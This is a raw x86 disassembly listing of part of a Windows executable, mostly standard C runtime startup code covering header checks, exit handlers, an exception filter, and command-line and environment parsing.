  4242f4:	or     dl,BYTE PTR [edx-0x10]
  4242f7:	hlt    
  4242f8:	dec    ebx
  4242f9:	loope  0x424331
  4242fb:	jnp    0x4242fe
  4242fd:	imul   ecx,DWORD PTR [edx],0x6828c2ee
  424303:	mov    esi,0x5a9b942d
  424308:	sahf   
  424309:	das    
  42430a:	fcom   DWORD PTR [edi-0x8]
  42430d:	inc    edi
  42430e:	rcr    eax,0xc0
  424311:	idiv   BYTE PTR [ecx]
  424313:	cli    
  424314:	sbb    DWORD PTR [edi-0x4b],edx
  424317:	xor    cl,BYTE PTR [ecx-0x71]
  42431a:	mov    esp,0x6a350390
  42431f:	add    ch,BYTE PTR [eax-0x60]
  424322:	add    BYTE PTR [eax],al
  424324:	add    BYTE PTR [edx+0x0],ch
  424327:	call   DWORD PTR ds:0x429030
  42432d:	push   0x0
  42432f:	push   0x0
  424331:	call   DWORD PTR ds:0x429138
  424337:	xor    eax,eax
  424339:	add    esp,0x10
  42433c:	ret    0x10
  42433f:	nop
  424340:	jmp    DWORD PTR ds:0x429124
  424346:	jmp    DWORD PTR ds:0x429128
  42434c:	jmp    DWORD PTR ds:0x42911c
  424352:	jmp    DWORD PTR ds:0x429118
  424358:	cmp    DWORD PTR ds:0x46707c,0x1
  42435f:	jne    0x424366
  424361:	call   0x4248a4
  424366:	push   DWORD PTR [esp+0x4]
  42436a:	call   0x42472d
  42436f:	push   0xff
  424374:	call   DWORD PTR ds:0x466774
  42437a:	pop    ecx
  42437b:	pop    ecx
  42437c:	ret    
  42437d:	cmp    DWORD PTR ds:0x46707c,0x1
  424384:	jne    0x42438b
  424386:	call   0x4248a4
  42438b:	push   DWORD PTR [esp+0x4]
  42438f:	call   0x42472d
  424394:	push   0xff
  424399:	call   0x424573
  42439e:	pop    ecx
  42439f:	pop    ecx
  4243a0:	ret    
  4243a1:	push   0x60
  4243a3:	push   0x429170
  4243a8:	call   0x425290
  4243ad:	mov    edi,0x94
  4243b2:	mov    eax,edi
  4243b4:	call   0x4252e0
  4243b9:	mov    DWORD PTR [ebp-0x18],esp
  4243bc:	mov    esi,esp
  4243be:	mov    DWORD PTR [esi],edi
  4243c0:	push   esi
  4243c1:	call   DWORD PTR ds:0x42906c
  4243c7:	mov    ecx,DWORD PTR [esi+0x10]
  4243ca:	mov    DWORD PTR ds:0x467084,ecx
  4243d0:	mov    eax,DWORD PTR [esi+0x4]
  4243d3:	mov    ds:0x467090,eax
  4243d8:	mov    edx,DWORD PTR [esi+0x8]
  4243db:	mov    DWORD PTR ds:0x467094,edx
  4243e1:	mov    esi,DWORD PTR [esi+0xc]
  4243e4:	and    esi,0x7fff
  4243ea:	mov    DWORD PTR ds:0x467088,esi
  4243f0:	cmp    ecx,0x2
  4243f3:	je     0x424401
  4243f5:	or     esi,0x8000
  4243fb:	mov    DWORD PTR ds:0x467088,esi
  424401:	shl    eax,0x8
  424404:	add    eax,edx
  424406:	mov    ds:0x46708c,eax
  42440b:	xor    esi,esi
  42440d:	push   esi
  42440e:	mov    edi,DWORD PTR ds:0x429044
  424414:	call   edi
  424416:	cmp    WORD PTR [eax],0x5a4d
  42441b:	jne    0x42443c
  42441d:	mov    ecx,DWORD PTR [eax+0x3c]
  424420:	add    ecx,eax
  424422:	cmp    DWORD PTR [ecx],0x4550
  424428:	jne    0x42443c
  42442a:	movzx  eax,WORD PTR [ecx+0x18]
  42442e:	cmp    eax,0x10b
  424433:	je     0x424454
  424435:	cmp    eax,0x20b
  42443a:	je     0x424441
  42443c:	mov    DWORD PTR [ebp-0x1c],esi
  42443f:	jmp    0x424468
  424441:	cmp    DWORD PTR [ecx+0x84],0xe
  424448:	jbe    0x42443c
  42444a:	xor    eax,eax
  42444c:	cmp    DWORD PTR [ecx+0xf8],esi
  424452:	jmp    0x424462
  424454:	cmp    DWORD PTR [ecx+0x74],0xe
  424458:	jbe    0x42443c
  42445a:	xor    eax,eax
  42445c:	cmp    DWORD PTR [ecx+0xe8],esi
  424462:	setne  al
  424465:	mov    DWORD PTR [ebp-0x1c],eax
  424468:	push   0x1
  42446a:	call   0x42523f
  42446f:	pop    ecx
  424470:	test   eax,eax
  424472:	jne    0x42447c
  424474:	push   0x1c
  424476:	call   0x42437d
  42447b:	pop    ecx
  42447c:	call   0x4251b6
  424481:	test   eax,eax
  424483:	jne    0x42448d
  424485:	push   0x10
  424487:	call   0x42437d
  42448c:	pop    ecx
  42448d:	call   0x42509f
  424492:	mov    DWORD PTR [ebp-0x4],esi
  424495:	call   0x424ea1
  42449a:	test   eax,eax
  42449c:	jge    0x4244a6
  42449e:	push   0x1b
  4244a0:	call   0x424358
  4244a5:	pop    ecx
  4244a6:	call   DWORD PTR ds:0x429068
  4244ac:	mov    ds:0x467834,eax
  4244b1:	call   0x424d7f
  4244b6:	mov    ds:0x467074,eax
  4244bb:	call   0x424cdd
  4244c0:	test   eax,eax
  4244c2:	jge    0x4244cc
  4244c4:	push   0x8
  4244c6:	call   0x424358
  4244cb:	pop    ecx
  4244cc:	call   0x424aaa
  4244d1:	test   eax,eax
  4244d3:	jge    0x4244dd
  4244d5:	push   0x9
  4244d7:	call   0x424358
  4244dc:	pop    ecx
  4244dd:	call   0x4245b5
  4244e2:	mov    DWORD PTR [ebp-0x20],eax
  4244e5:	cmp    eax,esi
  4244e7:	je     0x4244f0
  4244e9:	push   eax
  4244ea:	call   0x424358
  4244ef:	pop    ecx
  4244f0:	mov    DWORD PTR [ebp-0x38],esi
  4244f3:	lea    eax,[ebp-0x64]
  4244f6:	push   eax
  4244f7:	call   DWORD PTR ds:0x429064
  4244fd:	call   0x424a41
  424502:	mov    DWORD PTR [ebp-0x68],eax
  424505:	test   BYTE PTR [ebp-0x38],0x1
  424509:	je     0x424511
  42450b:	movzx  eax,WORD PTR [ebp-0x34]
  42450f:	jmp    0x424514
  424511:	push   0xa
  424513:	pop    eax
  424514:	push   eax
  424515:	push   DWORD PTR [ebp-0x68]
  424518:	push   esi
  424519:	push   esi
  42451a:	call   edi
  42451c:	push   eax
  42451d:	call   0x422e90
  424522:	mov    edi,eax
  424524:	mov    DWORD PTR [ebp-0x6c],edi
  424527:	cmp    DWORD PTR [ebp-0x1c],esi
  42452a:	jne    0x424532
  42452c:	push   edi
  42452d:	call   0x4246ed
  424532:	call   0x42470f
  424537:	jmp    0x424564
  424539:	mov    eax,DWORD PTR [ebp-0x14]
  42453c:	mov    ecx,DWORD PTR [eax]
  42453e:	mov    ecx,DWORD PTR [ecx]
  424540:	mov    DWORD PTR [ebp-0x70],ecx
  424543:	push   eax
  424544:	push   ecx
  424545:	call   0x4248dd
  42454a:	pop    ecx
  42454b:	pop    ecx
  42454c:	ret    
  42454d:	mov    esp,DWORD PTR [ebp-0x18]
  424550:	mov    edi,DWORD PTR [ebp-0x70]
  424553:	cmp    DWORD PTR [ebp-0x1c],0x0
  424557:	jne    0x42455f
  424559:	push   edi
  42455a:	call   0x4246fe
  42455f:	call   0x42471e
  424564:	or     DWORD PTR [ebp-0x4],0xffffffff
  424568:	mov    eax,edi
  42456a:	lea    esp,[ebp-0x7c]
  42456d:	call   0x4252cb
  424572:	ret    
  424573:	push   0x42918c
  424578:	call   DWORD PTR ds:0x429044
  42457e:	test   eax,eax
  424580:	je     0x424598
  424582:	push   0x42917c
  424587:	push   eax
  424588:	call   DWORD PTR ds:0x429048
  42458e:	test   eax,eax
  424590:	je     0x424598
  424592:	push   DWORD PTR [esp+0x4]
  424596:	call   eax
  424598:	push   DWORD PTR [esp+0x4]
  42459c:	call   DWORD PTR ds:0x429070
  4245a2:	int3   
  4245a3:	push   0x8
  4245a5:	call   0x42544f
  4245aa:	pop    ecx
  4245ab:	ret    
  4245ac:	push   0x8
  4245ae:	call   0x4253bb
  4245b3:	pop    ecx
  4245b4:	ret    
  4245b5:	mov    eax,ds:0x467830
  4245ba:	test   eax,eax
  4245bc:	je     0x4245c0
  4245be:	call   eax
  4245c0:	push   esi
  4245c1:	push   edi
  4245c2:	mov    ecx,0x42b00c
  4245c7:	mov    edi,0x42b018
  4245cc:	xor    eax,eax
  4245ce:	cmp    ecx,edi
  4245d0:	mov    esi,ecx
  4245d2:	jae    0x4245eb
  4245d4:	test   eax,eax
  4245d6:	jne    0x424617
  4245d8:	mov    ecx,DWORD PTR [esi]
  4245da:	test   ecx,ecx
  4245dc:	je     0x4245e0
  4245de:	call   ecx
  4245e0:	add    esi,0x4
  4245e3:	cmp    esi,edi
  4245e5:	jb     0x4245d4
  4245e7:	test   eax,eax
  4245e9:	jne    0x424617
  4245eb:	push   0x4250e3
  4245f0:	call   0x425560
  4245f5:	mov    esi,0x42b000
  4245fa:	mov    eax,esi
  4245fc:	mov    edi,0x42b008
  424601:	cmp    eax,edi
  424603:	pop    ecx
  424604:	jae    0x424615
  424606:	mov    eax,DWORD PTR [esi]
  424608:	test   eax,eax
  42460a:	je     0x42460e
  42460c:	call   eax
  42460e:	add    esi,0x4
  424611:	cmp    esi,edi
  424613:	jb     0x424606
  424615:	xor    eax,eax
  424617:	pop    edi
  424618:	pop    esi
  424619:	ret    
  42461a:	push   ebp
  42461b:	mov    ebp,esp
  42461d:	push   esi
  42461e:	push   edi
  42461f:	push   0x8
  424621:	call   0x42544f
  424626:	xor    esi,esi
  424628:	inc    esi
  424629:	cmp    DWORD PTR ds:0x4670c4,esi
  42462f:	pop    ecx
  424630:	jne    0x424642
  424632:	push   DWORD PTR [ebp+0x8]
  424635:	call   DWORD PTR ds:0x429078
  42463b:	push   eax
  42463c:	call   DWORD PTR ds:0x429074
  424642:	cmp    DWORD PTR [ebp+0xc],0x0
  424646:	mov    al,BYTE PTR [ebp+0x10]
  424649:	mov    DWORD PTR ds:0x4670c0,esi
  42464f:	mov    ds:0x4670bc,al
  424654:	jne    0x4246a8
  424656:	mov    ecx,DWORD PTR ds:0x467828
  42465c:	test   ecx,ecx
  42465e:	je     0x424689
  424660:	mov    eax,ds:0x467824
  424665:	sub    eax,0x4
  424668:	cmp    eax,ecx
  42466a:	jmp    0x424682
  42466c:	mov    eax,DWORD PTR [eax]
  42466e:	test   eax,eax
  424670:	je     0x424674
  424672:	call   eax
  424674:	mov    eax,ds:0x467824
  424679:	sub    eax,0x4
  42467c:	cmp    eax,DWORD PTR ds:0x467828
  424682:	mov    ds:0x467824,eax
  424687:	jae    0x42466c
  424689:	mov    eax,0x42b01c
  42468e:	mov    esi,0x42b020
  424693:	cmp    eax,esi
  424695:	mov    edi,eax
  424697:	jae    0x4246a8
  424699:	mov    eax,DWORD PTR [edi]
  42469b:	test   eax,eax
  42469d:	je     0x4246a1
  42469f:	call   eax
  4246a1:	add    edi,0x4
  4246a4:	cmp    edi,esi
  4246a6:	jb     0x424699
  4246a8:	mov    eax,0x42b024
  4246ad:	mov    esi,0x42b028
  4246b2:	cmp    eax,esi
  4246b4:	mov    edi,eax
  4246b6:	jae    0x4246c7
  4246b8:	mov    eax,DWORD PTR [edi]
  4246ba:	test   eax,eax
  4246bc:	je     0x4246c0
  4246be:	call   eax
  4246c0:	add    edi,0x4
  4246c3:	cmp    edi,esi
  4246c5:	jb     0x4246b8
  4246c7:	cmp    DWORD PTR [ebp+0x10],0x0
  4246cb:	pop    edi
  4246cc:	pop    esi
  4246cd:	je     0x4246d8
  4246cf:	push   0x8
  4246d1:	call   0x4253bb
  4246d6:	jmp    0x4246ea
  4246d8:	push   DWORD PTR [ebp+0x8]
  4246db:	mov    DWORD PTR ds:0x4670c4,0x1
  4246e5:	call   0x424573
  4246ea:	pop    ecx
  4246eb:	pop    ebp
  4246ec:	ret    
  4246ed:	push   0x0
  4246ef:	push   0x0
  4246f1:	push   DWORD PTR [esp+0xc]
  4246f5:	call   0x42461a
  4246fa:	add    esp,0xc
  4246fd:	ret    
  4246fe:	push   0x0
  424700:	push   0x1
  424702:	push   DWORD PTR [esp+0xc]
  424706:	call   0x42461a
  42470b:	add    esp,0xc
  42470e:	ret    
  42470f:	push   0x1
  424711:	push   0x0
  424713:	push   0x0
  424715:	call   0x42461a
  42471a:	add    esp,0xc
  42471d:	ret    
  42471e:	push   0x1
  424720:	push   0x1
  424722:	push   0x0
  424724:	call   0x42461a
  424729:	add    esp,0xc
  42472c:	ret    
  42472d:	push   ebp
  42472e:	mov    ebp,esp
  424730:	sub    esp,0x10c
  424736:	mov    eax,ds:0x4669f0
  42473b:	xor    eax,DWORD PTR [ebp+0x4]
  42473e:	mov    ecx,DWORD PTR [ebp+0x8]
  424741:	push   ebx
  424742:	push   esi
  424743:	mov    DWORD PTR [ebp-0x4],eax
  424746:	xor    edx,edx
  424748:	push   edi
  424749:	xor    eax,eax
  42474b:	cmp    ecx,DWORD PTR [eax*8+0x466780]
  424752:	je     0x42475a
  424754:	inc    eax
  424755:	cmp    eax,0x12
  424758:	jb     0x42474b
  42475a:	mov    esi,eax
  42475c:	shl    esi,0x3
  42475f:	cmp    ecx,DWORD PTR [esi+0x466780]
  424765:	jne    0x42488e
  42476b:	mov    eax,ds:0x46707c
  424770:	cmp    eax,0x1
  424773:	je     0x424869
  424779:	cmp    eax,edx
  42477b:	jne    0x42478a
  42477d:	cmp    DWORD PTR ds:0x466778,0x1
  424784:	je     0x424869
  42478a:	cmp    ecx,0xfc
  424790:	je     0x42488e
  424796:	push   0x104
  42479b:	lea    eax,[ebp-0x10c]
  4247a1:	push   eax
  4247a2:	push   edx
  4247a3:	mov    BYTE PTR [ebp-0x8],dl
  4247a6:	call   DWORD PTR ds:0x429084
  4247ac:	test   eax,eax
  4247ae:	jne    0x4247c3
  4247b0:	lea    eax,[ebp-0x10c]
  4247b6:	push   0x4294e4
  4247bb:	push   eax
  4247bc:	call   0x425670
  4247c1:	pop    ecx
  4247c2:	pop    ecx
  4247c3:	lea    eax,[ebp-0x10c]
  4247c9:	push   eax
  4247ca:	lea    edi,[ebp-0x10c]
  4247d0:	call   0x4258a0
  4247d5:	inc    eax
  4247d6:	cmp    eax,0x3c
  4247d9:	pop    ecx
  4247da:	jbe    0x424805
  4247dc:	lea    eax,[ebp-0x10c]
  4247e2:	push   eax
  4247e3:	call   0x4258a0
  4247e8:	mov    edi,eax
  4247ea:	lea    eax,[ebp-0x10c]
  4247f0:	sub    eax,0x3b
  4247f3:	push   0x3
  4247f5:	add    edi,eax
  4247f7:	push   0x4294e0
  4247fc:	push   edi
  4247fd:	call   0x425770
  424802:	add    esp,0x10
  424805:	push   edi
  424806:	call   0x4258a0
  42480b:	push   DWORD PTR [esi+0x466784]
  424811:	mov    ebx,eax
  424813:	call   0x4258a0
  424818:	lea    eax,[ebx+eax*1+0x1c]
  42481c:	pop    ecx
  42481d:	add    eax,0x3
  424820:	pop    ecx
  424821:	and    eax,0xfffffffc
  424824:	call   0x4252e0
  424829:	mov    ebx,esp
  42482b:	push   0x4294c4
  424830:	push   ebx
  424831:	call   0x425670
  424836:	push   edi
  424837:	push   ebx
  424838:	call   0x425680
  42483d:	push   0x4294c0
  424842:	push   ebx
  424843:	call   0x425680
  424848:	push   DWORD PTR [esi+0x466784]
  42484e:	push   ebx
  42484f:	call   0x425680
  424854:	push   0x12010
  424859:	push   0x429498
  42485e:	push   ebx
  42485f:	call   0x425572
  424864:	add    esp,0x2c
  424867:	jmp    0x42488e
  424869:	push   edx
  42486a:	lea    eax,[ebp+0x8]
  42486d:	push   eax
  42486e:	lea    esi,[esi+0x466784]
  424874:	push   DWORD PTR [esi]
  424876:	call   0x4258a0
  42487b:	pop    ecx
  42487c:	push   eax
  42487d:	push   DWORD PTR [esi]
  42487f:	push   0xfffffff4
  424881:	call   DWORD PTR ds:0x429080
  424887:	push   eax
  424888:	call   DWORD PTR ds:0x42907c
  42488e:	lea    esp,[ebp-0x118]
  424894:	mov    ecx,DWORD PTR [ebp-0x4]
  424897:	xor    ecx,DWORD PTR [ebp+0x4]
  42489a:	call   0x42595c
  42489f:	pop    edi
  4248a0:	pop    esi
  4248a1:	pop    ebx
  4248a2:	leave  
  4248a3:	ret    
  4248a4:	mov    eax,ds:0x46707c
  4248a9:	cmp    eax,0x1
  4248ac:	je     0x4248bb
  4248ae:	test   eax,eax
  4248b0:	jne    0x4248dc
  4248b2:	cmp    DWORD PTR ds:0x466778,0x1
  4248b9:	jne    0x4248dc
  4248bb:	push   0xfc
  4248c0:	call   0x42472d
  4248c5:	mov    eax,ds:0x4670c8
  4248ca:	test   eax,eax
  4248cc:	pop    ecx
  4248cd:	je     0x4248d1
  4248cf:	call   eax
  4248d1:	push   0xff
  4248d6:	call   0x42472d
  4248db:	pop    ecx
  4248dc:	ret    
  4248dd:	push   ebp
  4248de:	mov    ebp,esp
  4248e0:	push   ecx
  4248e1:	push   ebx
  4248e2:	push   esi
  4248e3:	push   edi
  4248e4:	call   0x425145
  4248e9:	mov    edi,DWORD PTR [ebp+0x8]
  4248ec:	mov    esi,eax
  4248ee:	mov    edx,DWORD PTR [esi+0x54]
  4248f1:	mov    eax,ds:0x466894
  4248f6:	mov    ecx,edx
  4248f8:	cmp    DWORD PTR [ecx],edi
  4248fa:	je     0x424909
  4248fc:	lea    ebx,[eax+eax*2]
  4248ff:	add    ecx,0xc
  424902:	lea    ebx,[edx+ebx*4]
  424905:	cmp    ecx,ebx
  424907:	jb     0x4248f8
  424909:	lea    eax,[eax+eax*2]
  42490c:	lea    eax,[edx+eax*4]
  42490f:	cmp    ecx,eax
  424911:	jae    0x424917
  424913:	cmp    DWORD PTR [ecx],edi
  424915:	je     0x424919
  424917:	xor    ecx,ecx
  424919:	test   ecx,ecx
  42491b:	je     0x424a33
  424921:	mov    ebx,DWORD PTR [ecx+0x8]
  424924:	test   ebx,ebx
  424926:	mov    DWORD PTR [ebp+0x8],ebx
  424929:	je     0x424a33
  42492f:	cmp    ebx,0x5
  424932:	jne    0x424940
  424934:	and    DWORD PTR [ecx+0x8],0x0
  424938:	xor    eax,eax
  42493a:	inc    eax
  42493b:	jmp    0x424a3c
  424940:	cmp    ebx,0x1
  424943:	je     0x424a2e
  424949:	mov    eax,DWORD PTR [esi+0x58]
  42494c:	mov    DWORD PTR [ebp-0x4],eax
  42494f:	mov    eax,DWORD PTR [ebp+0xc]
  424952:	mov    DWORD PTR [esi+0x58],eax
  424955:	mov    eax,DWORD PTR [ecx+0x4]
  424958:	cmp    eax,0x8
  42495b:	jne    0x424a20
  424961:	mov    edx,DWORD PTR ds:0x466888
  424967:	mov    eax,ds:0x46688c
  42496c:	add    eax,edx
  42496e:	cmp    edx,eax
  424970:	jge    0x424999
  424972:	lea    eax,[edx+edx*2]
  424975:	shl    eax,0x2
  424978:	mov    edi,DWORD PTR [esi+0x54]
  42497b:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424980:	mov    edi,DWORD PTR ds:0x466888
  424986:	mov    ebx,DWORD PTR ds:0x46688c
  42498c:	inc    edx
  42498d:	add    ebx,edi
  42498f:	add    eax,0xc
  424992:	cmp    edx,ebx
  424994:	jl     0x424978
  424996:	mov    ebx,DWORD PTR [ebp+0x8]
  424999:	mov    ecx,DWORD PTR [ecx]
  42499b:	cmp    ecx,0xc000008e
  4249a1:	mov    edi,DWORD PTR [esi+0x5c]
  4249a4:	jne    0x4249af
  4249a6:	mov    DWORD PTR [esi+0x5c],0x83
  4249ad:	jmp    0x424a13
  4249af:	cmp    ecx,0xc0000090
  4249b5:	jne    0x4249c0
  4249b7:	mov    DWORD PTR [esi+0x5c],0x81
  4249be:	jmp    0x424a13
  4249c0:	cmp    ecx,0xc0000091
  4249c6:	jne    0x4249d1
  4249c8:	mov    DWORD PTR [esi+0x5c],0x84
  4249cf:	jmp    0x424a13
  4249d1:	cmp    ecx,0xc0000093
  4249d7:	jne    0x4249e2
  4249d9:	mov    DWORD PTR [esi+0x5c],0x85
  4249e0:	jmp    0x424a13
  4249e2:	cmp    ecx,0xc000008d
  4249e8:	jne    0x4249f3
  4249ea:	mov    DWORD PTR [esi+0x5c],0x82
  4249f1:	jmp    0x424a13
  4249f3:	cmp    ecx,0xc000008f
  4249f9:	jne    0x424a04
  4249fb:	mov    DWORD PTR [esi+0x5c],0x86
  424a02:	jmp    0x424a13
  424a04:	cmp    ecx,0xc0000092
  424a0a:	jne    0x424a13
  424a0c:	mov    DWORD PTR [esi+0x5c],0x8a
  424a13:	push   DWORD PTR [esi+0x5c]
  424a16:	push   0x8
  424a18:	call   ebx
  424a1a:	pop    ecx
  424a1b:	mov    DWORD PTR [esi+0x5c],edi
  424a1e:	jmp    0x424a27
  424a20:	and    DWORD PTR [ecx+0x8],0x0
  424a24:	push   eax
  424a25:	call   ebx
  424a27:	mov    eax,DWORD PTR [ebp-0x4]
  424a2a:	pop    ecx
  424a2b:	mov    DWORD PTR [esi+0x58],eax
  424a2e:	or     eax,0xffffffff
  424a31:	jmp    0x424a3c
  424a33:	push   DWORD PTR [ebp+0xc]
  424a36:	call   DWORD PTR ds:0x429088
  424a3c:	pop    edi
  424a3d:	pop    esi
  424a3e:	pop    ebx
  424a3f:	leave  
  424a40:	ret    
  424a41:	cmp    DWORD PTR ds:0x46782c,0x0
  424a48:	jne    0x424a4f
  424a4a:	call   0x425e7c
  424a4f:	push   esi
  424a50:	mov    esi,DWORD PTR ds:0x467834
  424a56:	test   esi,esi
  424a58:	jne    0x424a61
  424a5a:	mov    esi,0x4294fb
  424a5f:	jmp    0x424aa6
  424a61:	mov    al,BYTE PTR [esi]
  424a63:	cmp    al,0x22
  424a65:	jne    0x424a8f
  424a67:	inc    esi
  424a68:	mov    al,BYTE PTR [esi]
  424a6a:	cmp    al,0x22
  424a6c:	je     0x424a9f
  424a6e:	test   al,al
  424a70:	je     0x424a88
  424a72:	movzx  eax,al
  424a75:	push   eax
  424a76:	call   0x42599b
  424a7b:	test   eax,eax
  424a7d:	pop    ecx
  424a7e:	je     0x424a81
  424a80:	inc    esi
  424a81:	inc    esi
  424a82:	mov    al,BYTE PTR [esi]
  424a84:	cmp    al,0x22
  424a86:	jne    0x424a6e
  424a88:	cmp    BYTE PTR [esi],0x22
  424a8b:	jne    0x424aa0
  424a8d:	jmp    0x424a9f
  424a8f:	cmp    al,0x20
  424a91:	jbe    0x424aa0
  424a93:	inc    esi
  424a94:	cmp    BYTE PTR [esi],0x20
  424a97:	ja     0x424a93
  424a99:	jmp    0x424aa0
  424a9b:	cmp    al,0x20
  424a9d:	ja     0x424aa6
  424a9f:	inc    esi
  424aa0:	mov    al,BYTE PTR [esi]
  424aa2:	test   al,al
  424aa4:	jne    0x424a9b
  424aa6:	mov    eax,esi
  424aa8:	pop    esi
  424aa9:	ret    
  424aaa:	push   ebx
  424aab:	xor    ebx,ebx
  424aad:	cmp    DWORD PTR ds:0x46782c,ebx
  424ab3:	push   esi
  424ab4:	push   edi
  424ab5:	jne    0x424abc
  424ab7:	call   0x425e7c
  424abc:	mov    esi,DWORD PTR ds:0x467074
  424ac2:	xor    edi,edi
  424ac4:	cmp    esi,ebx
  424ac6:	jne    0x424ada
  424ac8:	jmp    0x424afa
  424aca:	cmp    al,0x3d
  424acc:	je     0x424acf
  424ace:	inc    edi
  424acf:	push   esi
  424ad0:	call   0x4258a0
  424ad5:	pop    ecx
  424ad6:	lea    esi,[esi+eax*1+0x1]
  424ada:	mov    al,BYTE PTR [esi]
  424adc:	cmp    al,bl
  424ade:	jne    0x424aca
  424ae0:	lea    eax,[edi*4+0x4]
  424ae7:	push   eax
  424ae8:	call   0x425fb2
  424aed:	mov    edi,eax
  424aef:	cmp    edi,ebx
  424af1:	pop    ecx
  424af2:	mov    DWORD PTR ds:0x4670a4,edi
  424af8:	jne    0x424aff
  424afa:	or     eax,0xffffffff
  424afd:	jmp    0x424b57
  424aff:	mov    esi,DWORD PTR ds:0x467074
  424b05:	push   ebp
  424b06:	jmp    0x424b32
  424b08:	push   esi
  424b09:	call   0x4258a0
  424b0e:	mov    ebp,eax
  424b10:	inc    ebp
  424b11:	cmp    BYTE PTR [esi],0x3d
  424b14:	pop    ecx
  424b15:	je     0x424b30
  424b17:	push   ebp
  424b18:	call   0x425fb2
  424b1d:	cmp    eax,ebx
  424b1f:	pop    ecx
  424b20:	mov    DWORD PTR [edi],eax
  424b22:	je     0x424b5b
  424b24:	push   esi
  424b25:	push   eax
  424b26:	call   0x425670
  424b2b:	pop    ecx
  424b2c:	pop    ecx
  424b2d:	add    edi,0x4
  424b30:	add    esi,ebp
  424b32:	cmp    BYTE PTR [esi],bl
  424b34:	jne    0x424b08
  424b36:	push   DWORD PTR ds:0x467074
  424b3c:	call   0x425e9a
  424b41:	mov    DWORD PTR ds:0x467074,ebx
  424b47:	mov    DWORD PTR [edi],ebx
  424b49:	mov    DWORD PTR ds:0x467820,0x1
  424b53:	xor    eax,eax
  424b55:	pop    ecx
  424b56:	pop    ebp
  424b57:	pop    edi
  424b58:	pop    esi
  424b59:	pop    ebx
  424b5a:	ret    
  424b5b:	push   DWORD PTR ds:0x4670a4
  424b61:	call   0x425e9a
  424b66:	mov    DWORD PTR ds:0x4670a4,ebx
  424b6c:	or     eax,0xffffffff
  424b6f:	jmp    0x424b55
  424b71:	push   ebp
  424b72:	mov    ebp,esp
  424b74:	push   ecx
  424b75:	push   ebx
  424b76:	mov    ebx,DWORD PTR [ebp+0xc]
  424b79:	xor    edx,edx
  424b7b:	cmp    DWORD PTR [ebp+0x8],edx
  424b7e:	push   edi
  424b7f:	mov    DWORD PTR [esi],edx
  424b81:	mov    edi,ecx
  424b83:	mov    DWORD PTR [ebx],0x1
  424b89:	je     0x424b94
  424b8b:	mov    ecx,DWORD PTR [ebp+0x8]
  424b8e:	add    DWORD PTR [ebp+0x8],0x4
  424b92:	mov    DWORD PTR [ecx],edi
  424b94:	cmp    BYTE PTR [eax],0x22
  424b97:	jne    0x424ba7
  424b99:	xor    ecx,ecx
  424b9b:	test   edx,edx
  424b9d:	sete   cl
  424ba0:	inc    eax
  424ba1:	mov    edx,ecx
  424ba3:	mov    cl,0x22
  424ba5:	jmp    0x424bd4
  424ba7:	inc    DWORD PTR [esi]
  424ba9:	test   edi,edi
  424bab:	je     0x424bb2
  424bad:	mov    cl,BYTE PTR [eax]
  424baf:	mov    BYTE PTR [edi],cl
  424bb1:	inc    edi
  424bb2:	mov    cl,BYTE PTR [eax]
  424bb4:	movzx  ebx,cl
  424bb7:	inc    eax
  424bb8:	test   BYTE PTR [ebx+0x4674e1],0x4
  424bbf:	je     0x424bcd
  424bc1:	inc    DWORD PTR [esi]
  424bc3:	test   edi,edi
  424bc5:	je     0x424bcc
  424bc7:	mov    bl,BYTE PTR [eax]
  424bc9:	mov    BYTE PTR [edi],bl
  424bcb:	inc    edi
  424bcc:	inc    eax
  424bcd:	test   cl,cl
  424bcf:	mov    ebx,DWORD PTR [ebp+0xc]
  424bd2:	je     0x424c06
  424bd4:	test   edx,edx
  424bd6:	jne    0x424b94
  424bd8:	cmp    cl,0x20
  424bdb:	je     0x424be2
  424bdd:	cmp    cl,0x9
  424be0:	jne    0x424b94
  424be2:	test   edi,edi
  424be4:	je     0x424bea
  424be6:	and    BYTE PTR [edi-0x1],0x0
  424bea:	and    DWORD PTR [ebp-0x4],0x0
  424bee:	cmp    BYTE PTR [eax],0x0
  424bf1:	je     0x424ccd
  424bf7:	mov    cl,BYTE PTR [eax]
  424bf9:	cmp    cl,0x20
  424bfc:	je     0x424c03
  424bfe:	cmp    cl,0x9
  424c01:	jne    0x424c09
  424c03:	inc    eax
  424c04:	jmp    0x424bf7
  424c06:	dec    eax
  424c07:	jmp    0x424bea
  424c09:	cmp    BYTE PTR [eax],0x0
  424c0c:	je     0x424ccd
  424c12:	cmp    DWORD PTR [ebp+0x8],0x0
  424c16:	je     0x424c21
  424c18:	mov    ecx,DWORD PTR [ebp+0x8]
  424c1b:	add    DWORD PTR [ebp+0x8],0x4
  424c1f:	mov    DWORD PTR [ecx],edi
  424c21:	inc    DWORD PTR [ebx]
  424c23:	xor    ebx,ebx
  424c25:	inc    ebx
  424c26:	xor    edx,edx
  424c28:	jmp    0x424c2c
  424c2a:	inc    eax
  424c2b:	inc    edx
  424c2c:	cmp    BYTE PTR [eax],0x5c
  424c2f:	je     0x424c2a
  424c31:	cmp    BYTE PTR [eax],0x22
  424c34:	jne    0x424c5c
  424c36:	test   dl,0x1
  424c39:	jne    0x424c5a
  424c3b:	cmp    DWORD PTR [ebp-0x4],0x0
  424c3f:	je     0x424c4d
  424c41:	lea    ecx,[eax+0x1]
  424c44:	cmp    BYTE PTR [ecx],0x22
  424c47:	jne    0x424c4d
  424c49:	mov    eax,ecx
  424c4b:	jmp    0x424c4f
  424c4d:	xor    ebx,ebx
  424c4f:	xor    ecx,ecx
  424c51:	cmp    DWORD PTR [ebp-0x4],ecx
  424c54:	sete   cl
  424c57:	mov    DWORD PTR [ebp-0x4],ecx
  424c5a:	shr    edx,1
  424c5c:	test   edx,edx
  424c5e:	je     0x424c6d
  424c60:	test   edi,edi
  424c62:	je     0x424c68
  424c64:	mov    BYTE PTR [edi],0x5c
  424c67:	inc    edi
  424c68:	inc    DWORD PTR [esi]
  424c6a:	dec    edx
  424c6b:	jne    0x424c60
  424c6d:	mov    cl,BYTE PTR [eax]
  424c6f:	test   cl,cl
  424c71:	je     0x424cbb
  424c73:	cmp    DWORD PTR [ebp-0x4],0x0
  424c77:	jne    0x424c83
  424c79:	cmp    cl,0x20
  424c7c:	je     0x424cbb
  424c7e:	cmp    cl,0x9
  424c81:	je     0x424cbb
  424c83:	test   ebx,ebx
  424c85:	je     0x424cb5
  424c87:	test   edi,edi
  424c89:	je     0x424ca4
  424c8b:	movzx  edx,cl
  424c8e:	test   BYTE PTR [edx+0x4674e1],0x4
  424c95:	je     0x424c9d
  424c97:	mov    BYTE PTR [edi],cl
  424c99:	inc    edi
  424c9a:	inc    eax
